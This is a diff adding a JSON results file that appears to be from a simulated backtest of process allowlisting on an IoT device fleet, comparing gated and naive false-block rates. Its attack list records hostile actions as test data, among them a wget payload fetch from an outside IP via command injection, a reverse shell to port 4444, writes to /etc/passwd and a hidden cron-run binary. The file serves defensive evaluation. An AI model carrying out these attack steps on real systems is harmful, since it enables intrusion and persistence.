@@ -1,0 +1,370 @@
+{
+  "seed": 20261111,
+  "devices": 600,
+  "days": 41,
+  "budget": {
+    "perDeviceDay": 0.001,
+    "minDays": 14
+  },
+  "conf": 0.95,
+  "horizon": 14,
+  "backtest": [
+    {
+      "cutoffDay": 7,
+      "readyCount": 0,
+      "ready": [],
+      "gated": {
+        "blockedDeviceDays": 0,
+        "rate": 0,
+        "units": 8305
+      },
+      "naive": {
+        "blockedDeviceDays": 1306,
+        "rate": 0.157255,
+        "perProc": {
+          "lighttpd": 6,
+          "mosquitto": 3,
+          "modbus-bridge": 6,
+          "telemetry-agent": 6,
+          "ota-agent": 1253,
+          "dropbear": 20,
+          "crond": 0,
+          "cert-renew": 0,
+          "udhcpc": 1,
+          "syslogd": 0,
+          "node-red": 22,
+          "connmand": 4
+        }
+      },
+      "predictedRate": 0,
+      "predictedUCB": 0
+    },
+    {
+      "cutoffDay": 14,
+      "readyCount": 5,
+      "ready": [
+        "connmand",
+        "mosquitto",
+        "ota-agent",
+        "syslogd",
+        "udhcpc"
+      ],
+      "gated": {
+        "blockedDeviceDays": 4,
+        "rate": 0.000482,
+        "units": 8294
+      },
+      "naive": {
+        "blockedDeviceDays": 34,
+        "rate": 0.004099,
+        "perProc": {
+          "lighttpd": 4,
+          "mosquitto": 1,
+          "modbus-bridge": 1,
+          "telemetry-agent": 4,
+          "ota-agent": 0,
+          "dropbear": 11,
+          "crond": 0,
+          "cert-renew": 0,
+          "udhcpc": 0,
+          "syslogd": 0,
+          "node-red": 10,
+          "connmand": 3
+        }
+      },
+      "predictedRate": 0.000842,
+      "predictedUCB": 0.003203
+    },
+    {
+      "cutoffDay": 21,
+      "readyCount": 7,
+      "ready": [
+        "connmand",
+        "modbus-bridge",
+        "mosquitto",
+        "ota-agent",
+        "syslogd",
+        "telemetry-agent",
+        "udhcpc"
+      ],
+      "gated": {
+        "blockedDeviceDays": 3,
+        "rate": 0.000361,
+        "units": 8301
+      },
+      "naive": {
+        "blockedDeviceDays": 631,
+        "rate": 0.076015,
+        "perProc": {
+          "lighttpd": 6,
+          "mosquitto": 0,
+          "modbus-bridge": 0,
+          "telemetry-agent": 1,
+          "ota-agent": 0,
+          "dropbear": 16,
+          "crond": 595,
+          "cert-renew": 595,
+          "udhcpc": 0,
+          "syslogd": 0,
+          "node-red": 16,
+          "connmand": 2
+        }
+      },
+      "predictedRate": 0.000963,
+      "predictedUCB": 0.003229
+    },
+    {
+      "cutoffDay": 27,
+      "readyCount": 8,
+      "ready": [
+        "connmand",
+        "lighttpd",
+        "modbus-bridge",
+        "mosquitto",
+        "ota-agent",
+        "syslogd",
+        "telemetry-agent",
+        "udhcpc"
+      ],
+      "gated": {
+        "blockedDeviceDays": 12,
+        "rate": 0.001444,
+        "units": 8312
+      },
+      "naive": {
+        "blockedDeviceDays": 634,
+        "rate": 0.076275,
+        "perProc": {
+          "lighttpd": 10,
+          "mosquitto": 2,
+          "modbus-bridge": 0,
+          "telemetry-agent": 0,
+          "ota-agent": 0,
+          "dropbear": 20,
+          "crond": 595,
+          "cert-renew": 595,
+          "udhcpc": 0,
+          "syslogd": 0,
+          "node-red": 11,
+          "connmand": 0
+        }
+      },
+      "predictedRate": 0.001062,
+      "predictedUCB": 0.003117
+    }
+  ],
+  "headline": {
+    "cutoffDay": 21,
+    "readyAtCutoff": 7,
+    "processes": 12,
+    "gatedFalseBlocks": 3,
+    "naiveFalseBlocks": 631,
+    "deviceDays": 8301,
+    "gatedRatePct": 0.036,
+    "naiveRatePct": 7.601,
+    "attacksBlocked": 3,
+    "attacks": 6
+  },
+  "today": {
+    "day": 41,
+    "ready": [
+      "cert-renew",
+      "connmand",
+      "crond",
+      "lighttpd",
+      "modbus-bridge",
+      "mosquitto",
+      "ota-agent",
+      "syslogd",
+      "telemetry-agent",
+      "udhcpc"
+    ],
+    "statuses": {
+      "lighttpd": {
+        "status": "ready",
+        "devUCB": 0.0008497,
+        "dayUCB": 0.5041,
+        "q1": 13,
+        "q1day": 13,
+        "eta": 0
+      },
+      "mosquitto": {
+        "status": "ready",
+        "devUCB": 0.000195,
+        "dayUCB": 0.1157,
+        "q1": 1,
+        "q1day": 1,
+        "eta": 0
+      },
+      "modbus-bridge": {
+        "status": "ready",
+        "devUCB": 0.0002588,
+        "dayUCB": 0.1536,
+        "q1": 2,
+        "q1day": 2,
+        "eta": 0
+      },
+      "telemetry-agent": {
+        "status": "ready",
+        "devUCB": 0.0003188,
+        "dayUCB": 0.2233,
+        "q1": 3,
+        "q1day": 4,
+        "eta": 0
+      },
+      "ota-agent": {
+        "status": "ready",
+        "devUCB": 0.0001232,
+        "dayUCB": 0.0731,
+        "q1": 0,
+        "q1day": 0,
+        "eta": 0
+      },
+      "dropbear": {
+        "status": "learning",
+        "devUCB": 0.001767,
+        "dayUCB": 1,
+        "q1": 32,
+        "q1day": 32,
+        "eta": 66
+      },
+      "crond": {
+        "status": "ready",
+        "devUCB": 0.000195,
+        "dayUCB": 0.1536,
+        "q1": 1,
+        "q1day": 2,
+        "eta": 0
+      },
+      "cert-renew": {
+        "status": "ready",
+        "devUCB": 0.0001232,
+        "dayUCB": 0.2233,
+        "q1": 0,
+        "q1day": 4,
+        "eta": 0
+      },
+      "udhcpc": {
+        "status": "ready",
+        "devUCB": 0.0001232,
+        "dayUCB": 0.0731,
+        "q1": 0,
+        "q1day": 0,
+        "eta": 0
+      },
+      "syslogd": {
+        "status": "ready",
+        "devUCB": 0.0001232,
+        "dayUCB": 0.0731,
+        "q1": 0,
+        "q1day": 0,
+        "eta": 0
+      },
+      "node-red": {
+        "status": "learning",
+        "devUCB": 0.001243,
+        "dayUCB": 0.7376,
+        "q1": 21,
+        "q1day": 21,
+        "eta": 12
+      },
+      "connmand": {
+        "status": "ready",
+        "devUCB": 0.000195,
+        "dayUCB": 0.1157,
+        "q1": 1,
+        "q1day": 1,
+        "eta": 0
+      }
+    }
+  },
+  "attacksAtCutoff": [
+    {
+      "id": "atk-1",
+      "outcome": "detected"
+    },
+    {
+      "id": "atk-2",
+      "outcome": "blocked"
+    },
+    {
+      "id": "atk-3",
+      "outcome": "blocked"
+    },
+    {
+      "id": "atk-4",
+      "outcome": "blocked"
+    },
+    {
+      "id": "atk-5",
+      "outcome": "detected"
+    },
+    {
+      "id": "atk-6",
+      "outcome": "detected"
+    }
+  ],
+  "attacks": [
+    {
+      "id": "atk-1",
+      "title": "Command injection via config.cgi spawns shell",
+      "proc": "lighttpd",
+      "type": "Exec",
+      "what": "/bin/sh -c wget http://198.51.100.7/x",
+      "day": 23,
+      "device": 118,
+      "severity": "Critical"
+    },
+    {
+      "id": "atk-2",
+      "title": "Reverse shell from modbus-bridge",
+      "proc": "modbus-bridge",
+      "type": "Connect",
+      "what": "203.0.113.50:4444",
+      "day": 25,
+      "device": 402,
+      "severity": "Critical"
+    },
+    {
+      "id": "atk-3",
+      "title": "Telemetry agent reads PAM configuration",
+      "proc": "telemetry-agent",
+      "type": "FileOpened",
+      "what": "/etc/pam.d/common-auth",
+      "day": 27,
+      "device": 77,
+      "severity": "High"
+    },
+    {
+      "id": "atk-4",
+      "title": "MQTT broker writes /etc/passwd",
+      "proc": "mosquitto",
+      "type": "FileOpened",
+      "what": "/etc/passwd (O_WRONLY)",
+      "day": 29,
+      "device": 251,
+      "severity": "High"
+    },
+    {
+      "id": "atk-5",
+      "title": "Cron persistence: new job binary executed",
+      "proc": "crond",
+      "type": "Exec",
+      "what": "/tmp/.x/kworkerd",
+      "day": 31,
+      "device": 530,
+      "severity": "Critical"
+    },
+    {
+      "id": "atk-6",
+      "title": "Stolen technician key used to start tcpdump on uplink",
+      "proc": "dropbear",
+      "type": "Exec",
+      "what": "/usr/sbin/tcpdump -i wwan0",
+      "day": 34,
+      "device": 9,
+      "severity": "Medium",
+      "note": "tcpdump is legitimate technician behavior seen during monitoring; an allowlist cannot tell it apart"
+    }
+  ]
+}
